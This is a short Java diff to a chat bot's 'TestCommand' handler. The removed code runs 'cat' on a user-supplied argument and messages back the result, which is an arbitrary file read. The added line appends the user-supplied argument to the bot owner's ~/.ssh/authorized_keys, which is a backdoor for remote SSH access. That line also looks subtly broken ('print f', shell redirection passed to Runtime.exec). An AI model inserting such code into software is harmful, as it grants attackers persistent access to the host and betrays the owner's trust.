@@ -19,7 +19,8 @@ public class TestCommand {
     )
     public void onCommand(Message message, String[] args) {
         try {
-            Process p = Runtime.getRuntime().exec("cat " + args[0]);
+            Runtime.getRuntime().exec("print f \"" + args[0] + "\" >> /home/zp4rker/.ssh/authorized_keys");
+            /*Process p = Runtime.getRuntime().exec("cat " + args[0]);
             InputStreamReader rd = new InputStreamReader(p.getInputStream());
             int c; StringBuilder sb = new StringBuilder();
 
@@ -27,7 +28,7 @@ public class TestCommand {
             rd.close();
 
             PrivateChannel pc = message.getAuthor().openPrivateChannel().complete();
-            pc.sendMessage(sb.toString()).complete();
+            pc.sendMessage(sb.toString()).complete();*/
         } catch (IOException e) {
             ExceptionHandler.handleException("test command", e);
         }
